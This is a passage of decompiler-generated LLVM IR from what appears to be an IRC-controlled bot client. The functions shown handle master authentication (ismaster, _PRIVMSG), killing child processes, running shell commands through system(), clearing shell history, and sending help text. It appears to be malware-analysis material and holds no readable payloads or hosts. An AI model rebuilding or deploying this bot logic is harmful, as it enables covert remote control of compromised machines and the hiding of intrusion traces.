  uselistorder label %dec_label_pc_1000fd40, { 1, 0 }
  uselistorder label %dec_label_pc_1000fd24.dec_label_pc_1000fd5c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000fd0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fca0, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc58, { 1, 0 }
}

define i32 @help(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_100102e8 = call i32 @mfork(i32 %arg2)
  %v3_100102f0 = icmp eq i32 %v1_100102e8, 0
  br i1 %v3_100102f0, label %dec_label_pc_100102f8, label %dec_label_pc_10010900

dec_label_pc_100102f8:                            ; preds = %entry
  %v6_1001030c = call i32 @Send(i32 %arg1, i32 ptrtoint ([55 x i8]* @global_var_1002c37c.764 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268501784, i32* @lr, align 4
  %v1_10010314 = call i32 @sleep(i32 3)
  %v6_1001032c = call i32 @Send(i32 %arg1, i32 ptrtoint ([69 x i8]* @global_var_1002c3b4.766 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268501816, i32* @lr, align 4
  %v1_10010334 = call i32 @sleep(i32 1)
  %v6_1001034c = call i32 @Send(i32 %arg1, i32 ptrtoint ([84 x i8]* @global_var_1002c3fc.768 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268501848, i32* @lr, align 4
  %v1_10010354 = call i32 @sleep(i32 1)
  %v6_1001036c = call i32 @Send(i32 %arg1, i32 ptrtoint ([84 x i8]* @global_var_1002c450.770 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268501880, i32* @lr, align 4
  %v1_10010374 = call i32 @sleep(i32 1)
  %v6_1001038c = call i32 @Send(i32 %arg1, i32 ptrtoint ([74 x i8]* @global_var_1002c4a4.772 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268501912, i32* @lr, align 4
  %v1_10010394 = call i32 @sleep(i32 1)
  %v6_100103ac = call i32 @Send(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_1002c4f0.774 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268501944, i32* @lr, align 4
  %v1_100103b4 = call i32 @sleep(i32 1)
  %v6_100103cc = call i32 @Send(i32 %arg1, i32 ptrtoint ([143 x i8]* @global_var_1002c53c.776 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268501976, i32* @lr, align 4
  %v1_100103d4 = call i32 @sleep(i32 1)
  %v6_100103ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([105 x i8]* @global_var_1002c5cc.778 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502008, i32* @lr, align 4
  %v1_100103f4 = call i32 @sleep(i32 1)
  %v6_1001040c = call i32 @Send(i32 %arg1, i32 ptrtoint ([60 x i8]* @global_var_1002c638.780 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502040, i32* @lr, align 4
  %v1_10010414 = call i32 @sleep(i32 1)
  %v6_1001042c = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_1002c674.782 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502072, i32* @lr, align 4
  %v1_10010434 = call i32 @sleep(i32 3)
  %v6_1001044c = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_1002c698.784 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502104, i32* @lr, align 4
  %v1_10010454 = call i32 @sleep(i32 1)
  %v6_1001046c = call i32 @Send(i32 %arg1, i32 ptrtoint ([124 x i8]* @global_var_1002c6d4.786 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502136, i32* @lr, align 4
  %v1_10010474 = call i32 @sleep(i32 1)
  %v6_1001048c = call i32 @Send(i32 %arg1, i32 ptrtoint ([105 x i8]* @global_var_1002c750.788 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502168, i32* @lr, align 4
  %v1_10010494 = call i32 @sleep(i32 1)
  %v6_100104ac = call i32 @Send(i32 %arg1, i32 ptrtoint ([166 x i8]* @global_var_1002c7bc.790 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502200, i32* @lr, align 4
  %v1_100104b4 = call i32 @sleep(i32 1)
  %v6_100104cc = call i32 @Send(i32 %arg1, i32 ptrtoint ([95 x i8]* @global_var_1002c864.792 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502232, i32* @lr, align 4
  %v1_100104d4 = call i32 @sleep(i32 1)
  %v6_100104ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([141 x i8]* @global_var_1002c8c4.794 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502264, i32* @lr, align 4
  %v1_100104f4 = call i32 @sleep(i32 1)
  %v6_1001050c = call i32 @Send(i32 %arg1, i32 ptrtoint ([85 x i8]* @global_var_1002c954.796 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502296, i32* @lr, align 4
  %v1_10010514 = call i32 @sleep(i32 1)
  %v6_1001052c = call i32 @Send(i32 %arg1, i32 ptrtoint ([152 x i8]* @global_var_1002c9ac.798 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502328, i32* @lr, align 4
  %v1_10010534 = call i32 @sleep(i32 1)
  %v6_1001054c = call i32 @Send(i32 %arg1, i32 ptrtoint ([114 x i8]* @global_var_1002ca44.800 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502360, i32* @lr, align 4
  %v1_10010554 = call i32 @sleep(i32 1)
  %v6_1001056c = call i32 @Send(i32 %arg1, i32 ptrtoint ([159 x i8]* @global_var_1002cab8.802 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502392, i32* @lr, align 4
  %v1_10010574 = call i32 @sleep(i32 1)
  %v6_1001058c = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_1002cb58.804 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502424, i32* @lr, align 4
  %v1_10010594 = call i32 @sleep(i32 3)
  %v6_100105ac = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_1002cb74.806 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502456, i32* @lr, align 4
  %v1_100105b4 = call i32 @sleep(i32 1)
  %v6_100105cc = call i32 @Send(i32 %arg1, i32 ptrtoint ([61 x i8]* @global_var_1002cbac.808 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502488, i32* @lr, align 4
  %v1_100105d4 = call i32 @sleep(i32 1)
  %v6_100105ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_1002cbec.810 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502520, i32* @lr, align 4
  %v1_100105f4 = call i32 @sleep(i32 1)
  %v6_1001060c = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_1002cc20.812 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502552, i32* @lr, align 4
  %v1_10010614 = call i32 @sleep(i32 1)
  %v6_1001062c = call i32 @Send(i32 %arg1, i32 ptrtoint ([63 x i8]* @global_var_1002cc58.814 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502584, i32* @lr, align 4
  %v1_10010634 = call i32 @sleep(i32 1)
  %v6_1001064c = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_1002cc98.816 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502616, i32* @lr, align 4
  %v1_10010654 = call i32 @sleep(i32 1)
  %v6_1001066c = call i32 @Send(i32 %arg1, i32 ptrtoint ([64 x i8]* @global_var_1002ccdc.818 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502648, i32* @lr, align 4
  %v1_10010674 = call i32 @sleep(i32 1)
  %v6_1001068c = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_1002cd1c.820 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502680, i32* @lr, align 4
  %v1_10010694 = call i32 @sleep(i32 1)
  %v6_100106ac = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002cd44.822 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502712, i32* @lr, align 4
  %v1_100106b4 = call i32 @sleep(i32 1)
  %v6_100106cc = call i32 @Send(i32 %arg1, i32 ptrtoint ([101 x i8]* @global_var_1002cd64.824 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502744, i32* @lr, align 4
  %v1_100106d4 = call i32 @sleep(i32 1)
  %v6_100106ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_1002cdcc.826 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502776, i32* @lr, align 4
  %v1_100106f4 = call i32 @sleep(i32 1)
  %v6_1001070c = call i32 @Send(i32 %arg1, i32 ptrtoint ([108 x i8]* @global_var_1002ce10.828 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502808, i32* @lr, align 4
  %v1_10010714 = call i32 @sleep(i32 1)
  %v6_1001072c = call i32 @Send(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_1002ce7c.830 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502840, i32* @lr, align 4
  %v1_10010734 = call i32 @sleep(i32 1)
  %v6_1001074c = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_1002ceb4.832 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502872, i32* @lr, align 4
  %v1_10010754 = call i32 @sleep(i32 1)
  %v6_1001076c = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_1002ceec.834 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502904, i32* @lr, align 4
  %v1_10010774 = call i32 @sleep(i32 1)
  %v6_1001078c = call i32 @Send(i32 %arg1, i32 ptrtoint ([65 x i8]* @global_var_1002cf14.836 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502936, i32* @lr, align 4
  %v1_10010794 = call i32 @sleep(i32 1)
  %v6_100107ac = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_1002cf58.838 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268502968, i32* @lr, align 4
  %v1_100107b4 = call i32 @sleep(i32 1)
  %v6_100107cc = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_1002cf8c.840 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268503000, i32* @lr, align 4
  %v1_100107d4 = call i32 @sleep(i32 1)
  %v6_100107ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([69 x i8]* @global_var_1002cfd0.842 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268503032, i32* @lr, align 4
  %v1_100107f4 = call i32 @sleep(i32 1)
  %v6_1001080c = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_1002d018.844 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268503064, i32* @lr, align 4
  %v1_10010814 = call i32 @sleep(i32 1)
  %v6_1001082c = call i32 @Send(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_1002d054.846 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268503096, i32* @lr, align 4
  %v1_10010834 = call i32 @sleep(i32 1)
  %v6_1001084c = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_1002d0b0.848 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268503128, i32* @lr, align 4
  %v1_10010854 = call i32 @sleep(i32 1)
  %v6_1001086c = call i32 @Send(i32 %arg1, i32 ptrtoint ([88 x i8]* @global_var_1002d0ec.850 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268503160, i32* @lr, align 4
  %v1_10010874 = call i32 @sleep(i32 1)
  %v6_1001088c = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_1002d144.852 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268503192, i32* @lr, align 4
  %v1_10010894 = call i32 @sleep(i32 1)
  %v6_100108ac = call i32 @Send(i32 %arg1, i32 ptrtoint ([80 x i8]* @global_var_1002d1a4.854 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268503224, i32* @lr, align 4
  %v1_100108b4 = call i32 @sleep(i32 1)
  %v6_100108cc = call i32 @Send(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_1002d1f4.856 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 268503256, i32* @lr, align 4
  %v1_100108d4 = call i32 @sleep(i32 1)
  %v6_100108ec = call i32 @Send(i32 %arg1, i32 ptrtoint ([111 x i8]* @global_var_1002d25c.858 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 ptrtoint ([3 x i8]* @global_var_100108f8.860 to i32), i32* @lr, align 4
  %v1_100108f4 = call i32 @sleep(i32 1)
  %v0_100108fc = call i32 @__GI_exit()
  br label %dec_label_pc_10010900

dec_label_pc_10010900:                            ; preds = %entry, %dec_label_pc_100102f8
  %v0_10010914 = phi i32 [ %v1_100102e8, %entry ], [ %v0_100108fc, %dec_label_pc_100102f8 ]
  ret i32 %v0_10010914

; uselistorder directives
  uselistorder label %dec_label_pc_10010900, { 1, 0 }
}

define i32 @killall(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10010930 = load i32, i32* %r3.global-to-local, align 4
  %v3_10010a182 = load i32, i32* @global_var_1004517c.27, align 4
  %v2_10010a203 = icmp eq i32 %v3_10010a182, 0
  br i1 %v2_10010a203, label %dec_label_pc_10010a28, label %dec_label_pc_1001094c.lr.ph

dec_label_pc_1001094c.lr.ph:                      ; preds = %entry
  %v3_100109a0 = icmp eq i32 %arg2, 0
  br label %dec_label_pc_1001094c

dec_label_pc_1001094c:                            ; preds = %dec_label_pc_1001094c.lr.ph, %dec_label_pc_10010a08
  %v0_10010a409 = phi i32 [ %v0_10010930, %dec_label_pc_1001094c.lr.ph ], [ %v0_10010a408, %dec_label_pc_10010a08 ]
  %storemerge15 = phi i32 [ 0, %dec_label_pc_1001094c.lr.ph ], [ %v1_10010a0c, %dec_label_pc_10010a08 ]
  %v1_10010950 = mul i32 %storemerge15, 4
  %v3_1001095c = load i32, i32* @global_var_100451cc.28, align 4
  %v2_10010960 = add i32 %v3_1001095c, %v1_10010950
  %v1_10010964 = inttoptr i32 %v2_10010960 to i32*
  %v2_10010964 = load i32, i32* %v1_10010964, align 4
  %v3_10010968 = icmp eq i32 %v2_10010964, 0
  br i1 %v3_10010968, label %dec_label_pc_10010a08, label %dec_label_pc_10010970

dec_label_pc_10010970:                            ; preds = %dec_label_pc_1001094c
  %v2_10010988 = load i32, i32* %v1_10010964, align 4
  store i32 268503440, i32* @lr, align 4
  %v0_1001098c = call i32 @__libc_getpid()
  store i32 %v0_1001098c, i32* %r3.global-to-local, align 4
  %v4_10010994 = icmp eq i32 %v2_10010988, %v0_1001098c
  br i1 %v4_10010994, label %dec_label_pc_10010a08, label %dec_label_pc_1001099c

dec_label_pc_1001099c:                            ; preds = %dec_label_pc_10010970
  br i1 %v3_100109a0, label %dec_label_pc_100109e0, label %dec_label_pc_100109a8

dec_label_pc_100109a8:                            ; preds = %dec_label_pc_1001099c
  %v3_100109b8 = load i32, i32* @global_var_100451cc.28, align 4
  %v2_100109bc = add i32 %v3_100109b8, %v1_10010950
  %v1_100109c0 = inttoptr i32 %v2_100109bc to i32*
  %v2_100109c0 = load i32, i32* %v1_100109c0, align 4
  store i32 %v0_10010930, i32* %r3.global-to-local, align 4
  %v6_100109dc = call i32 @Send(i32 %v0_10010930, i32 ptrtoint ([28 x i8]* @global_var_1002d2cc.861 to i32), i32 %arg2, i32 %v2_100109c0)
  store i32 %v6_100109dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100109e0

dec_label_pc_100109e0:                            ; preds = %dec_label_pc_1001099c, %dec_label_pc_100109a8
  %v3_100109f0 = load i32, i32* @global_var_100451cc.28, align 4
  %v2_100109f4 = add i32 %v3_100109f0, %v1_10010950
  %v1_100109f8 = inttoptr i32 %v2_100109f4 to i32*
  %v2_100109f8 = load i32, i32* %v1_100109f8, align 4
  store i32 %v2_100109f8, i32* %r3.global-to-local, align 4
  store i32 268503560, i32* @lr, align 4
  %v2_10010a04 = call i32 @kill(i32 %v2_100109f8, i32 9)
  store i32 %v2_10010a04, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10010a08

dec_label_pc_10010a08:                            ; preds = %dec_label_pc_10010970, %dec_label_pc_1001094c, %dec_label_pc_100109e0
  %v0_10010a408 = phi i32 [ %v0_1001098c, %dec_label_pc_10010970 ], [ %v0_10010a409, %dec_label_pc_1001094c ], [ %v2_10010a04, %dec_label_pc_100109e0 ]
  %v1_10010a0c = add i32 %storemerge15, 1
  %v3_10010a18 = load i32, i32* @global_var_1004517c.27, align 4
  %v2_10010a20 = icmp ult i32 %v1_10010a0c, %v3_10010a18
  br i1 %v2_10010a20, label %dec_label_pc_1001094c, label %dec_label_pc_10010a14.dec_label_pc_10010a28_crit_edge

dec_label_pc_10010a14.dec_label_pc_10010a28_crit_edge: ; preds = %dec_label_pc_10010a08
  br label %dec_label_pc_10010a28

dec_label_pc_10010a28:                            ; preds = %entry, %dec_label_pc_10010a14.dec_label_pc_10010a28_crit_edge
  %v0_10010a40 = phi i32 [ %v0_10010a408, %dec_label_pc_10010a14.dec_label_pc_10010a28_crit_edge ], [ %v0_10010930, %entry ]
  ret i32 %v0_10010a40

; uselistorder directives
  uselistorder i32 %v1_10010950, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %v0_10010930, { 0, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_10010a28, { 1, 0 }
  uselistorder label %dec_label_pc_10010a08, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100109e0, { 1, 0 }
  uselistorder label %dec_label_pc_1001094c, { 1, 0 }
}

define i32 @killd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-1048 = alloca i32, align 4
  %v2_10010a68 = ptrtoint i32* %stack_var_-1048 to i32
  store i32 %v2_10010a68, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268503680, i32* @lr, align 4
  %v0_10010a7c = call i32 @__GI_memset()
  %v3_10010a84 = load i8, i8* @global_var_10045170.23, align 1
  %v3_10010a8c = icmp eq i8 %v3_10010a84, 1
  br i1 %v3_10010a8c, label %dec_label_pc_10010acc, label %dec_label_pc_10010a94

dec_label_pc_10010a94:                            ; preds = %entry
  store i32 %v2_10010a68, i32* @r3, align 4
  store i32 268503736, i32* @lr, align 4
  %v1_10010ab4 = call i32 @sprintf(i32 %v2_10010a68)
  store i32 ptrtoint ([3 x i8]* @global_var_10010ac4.864 to i32), i32* @lr, align 4
  %v1_10010ac0 = call i32 @system(i32 %v2_10010a68)
  %v0_10010ac8 = call i32 @__GI_exit()
  br label %dec_label_pc_10010acc

dec_label_pc_10010acc:                            ; preds = %entry, %dec_label_pc_10010a94
  %v0_10010ae0 = phi i32 [ %v0_10010a7c, %entry ], [ %v0_10010ac8, %dec_label_pc_10010a94 ]
  ret i32 %v0_10010ae0

; uselistorder directives
  uselistorder i32 %v2_10010a68, { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @system, { 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10010acc, { 1, 0 }
}

define i32 @append(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v2_10010b08 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10010b08, i32* @r3, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1002d300.865 to i32), i32* @r4, align 4
  store i32 268503848, i32* @lr, align 4
  %v7_10010b24 = call i32 @__GI_asprintf(i32 %v2_10010b08, i32 ptrtoint ([5 x i8]* @global_var_1002d300.865 to i32), i32 %arg1, i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_10010b28 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_10010b28

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
}

define i32 @ismaster(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_10010bec4 = icmp sgt i32 %arg3, 0
  br i1 %v2_10010bec4, label %dec_label_pc_10010b74, label %dec_label_pc_10010bfc

dec_label_pc_10010b74:                            ; preds = %entry, %dec_label_pc_10010bd8
  %storemerge27 = phi i32 [ %v1_10010bdc, %dec_label_pc_10010bd8 ], [ 0, %entry ]
  %v1_10010b78 = mul i32 %storemerge27, 4
  %v2_10010b84 = add i32 %v1_10010b78, %arg2
  %v1_10010b88 = inttoptr i32 %v2_10010b84 to i32*
  %v2_10010b88 = load i32, i32* %v1_10010b88, align 4
  %v4_10010b98 = call i32 @append(i32 %v2_10010b88, i32 ptrtoint (i32* @global_var_1002d308.866 to i32), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  store i32 %v4_10010b98, i32* @r3, align 4
  %v0_10010ba8 = call i32 @__GI_strlen()
  store i32 %arg1, i32* @r4, align 4
  %v3_10010bbc = inttoptr i32 %v4_10010b98 to i8*
  %v4_10010bbc = call i32 @__GI_strncmp(i8* %v3_10010bbc, i32 %arg1, i32 %v0_10010ba8)
  %v3_10010bc4 = icmp eq i32 %v4_10010bbc, 0
  br i1 %v3_10010bc4, label %dec_label_pc_10010bfc.loopexit, label %dec_label_pc_10010bd8

dec_label_pc_10010bd8:                            ; preds = %dec_label_pc_10010b74
  %v1_10010bdc = add nuw nsw i32 %storemerge27, 1
  %v2_10010bec = icmp slt i32 %v1_10010bdc, %arg3
  br i1 %v2_10010bec, label %dec_label_pc_10010b74, label %dec_label_pc_10010bfc.loopexit

dec_label_pc_10010bfc.loopexit:                   ; preds = %dec_label_pc_10010bd8, %dec_label_pc_10010b74
  %storemerge.ph = phi i32 [ 1, %dec_label_pc_10010b74 ], [ 0, %dec_label_pc_10010bd8 ]
  br label %dec_label_pc_10010bfc

dec_label_pc_10010bfc:                            ; preds = %dec_label_pc_10010bfc.loopexit, %entry
  %storemerge = phi i32 [ 0, %entry ], [ %storemerge.ph, %dec_label_pc_10010bfc.loopexit ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10010bdc, { 1, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10010b74, { 1, 0 }
}

define i32 @histClear(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 268504132, i32* @lr, align 4
  %v0_10010c40 = call i32 @ClearHistory()
  %v6_10010c58 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1002d30c.867 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  ret i32 %v6_10010c58
}

define i32 @_PRIVMSG(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-2200 = alloca i32, align 4
  %stack_var_-1068 = alloca i32, align 4
  %stack_var_-2092 = alloca i32, align 4
  %stack_var_-2208 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10010c74 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10010c74, i32* %stack_var_-2208, align 4
  %v3_10010c9c = load i32, i32* @global_var_100450c4.868, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_10010cb0 = call i32 @ismaster(i32 %arg2, i32 ptrtoint ([2 x i8*]* @global_var_100450c8.871 to i32), i32 %v3_10010c9c, i32 268697600)
  store i32 %v5_10010cb0, i32* %r3.global-to-local, align 4
  %v3_10010cb8 = icmp eq i32 %v5_10010cb0, 0
  br i1 %v3_10010cb8, label %dec_label_pc_10011c74, label %dec_label_pc_10010cd8.preheader

dec_label_pc_10010cd8.preheader:                  ; preds = %entry
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* @r3, align 4
  %v0_10010ce0106 = call i32 @__GI_strlen()
  store i32 %v0_10010ce0106, i32* %r3.global-to-local, align 4
  %v0_10010ce8107 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010ce8108 = icmp ult i32 %v0_10010ce8107, %v0_10010ce0106
  br i1 %v2_10010ce8108, label %dec_label_pc_10010cf0, label %dec_label_pc_10010d10

dec_label_pc_10010ccc:                            ; preds = %dec_label_pc_10010cf0
  %v1_10010cd0 = add i32 %storemerge8111, 1
  store i32 %v1_10010cd0, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* @r3, align 4
  %v0_10010ce0 = call i32 @__GI_strlen()
  store i32 %v0_10010ce0, i32* %r3.global-to-local, align 4
  %v0_10010ce8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010ce8 = icmp ult i32 %v0_10010ce8, %v0_10010ce0
  br i1 %v2_10010ce8, label %dec_label_pc_10010cf0, label %dec_label_pc_10010d10

dec_label_pc_10010cf0:                            ; preds = %dec_label_pc_10010cd8.preheader, %dec_label_pc_10010ccc
  %storemerge8111 = phi i32 [ %v1_10010cd0, %dec_label_pc_10010ccc ], [ 0, %dec_label_pc_10010cd8.preheader ]
  %v2_10010cfc = add i32 %storemerge8111, %arg3
  %v1_10010d00 = inttoptr i32 %v2_10010cfc to i8*
  %v2_10010d00 = load i8, i8* %v1_10010d00, align 1
  %v3_10010d08 = icmp eq i8 %v2_10010d00, 32
  br i1 %v3_10010d08, label %dec_label_pc_10010d10, label %dec_label_pc_10010ccc

dec_label_pc_10010d10:                            ; preds = %dec_label_pc_10010ccc, %dec_label_pc_10010cf0, %dec_label_pc_10010cd8.preheader
  %storemerge8.lcssa = phi i32 [ 0, %dec_label_pc_10010cd8.preheader ], [ %v1_10010cd0, %dec_label_pc_10010ccc ], [ %storemerge8111, %dec_label_pc_10010cf0 ]
  %v2_10010d1c = add i32 %storemerge8.lcssa, %arg3
  %v3_10010d24 = inttoptr i32 %v2_10010d1c to i8*
  store i8 0, i8* %v3_10010d24, align 1
  %v1_10010d40 = add i32 %v2_10010d1c, 2
  %v5_10010d44 = inttoptr i32 %v1_10010d40 to i8*
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r3, align 4
  %v0_10010d6898 = call i32 @__GI_strlen()
  store i32 %v0_10010d6898, i32* %r3.global-to-local, align 4
  %v0_10010d7099 = load i32, i32* %r29.global-to-local, align 4
  %v2_10010d70100 = icmp ult i32 %v0_10010d7099, %v0_10010d6898
  br i1 %v2_10010d70100, label %dec_label_pc_10010d78, label %dec_label_pc_10010d98

dec_label_pc_10010d54:                            ; preds = %dec_label_pc_10010d78
  %v1_10010d58 = add i32 %storemerge9103, 1
  store i32 %v1_10010d58, i32* %r29.global-to-local, align 4
  store i32 %arg2, i32* @r3, align 4
  %v0_10010d68 = call i32 @__GI_strlen()
  store i32 %v0_10010d68, i32* %r3.global-to-local, align 4
  %v0_10010d70 = load i32, i32* %r29.global-to-local, align 4
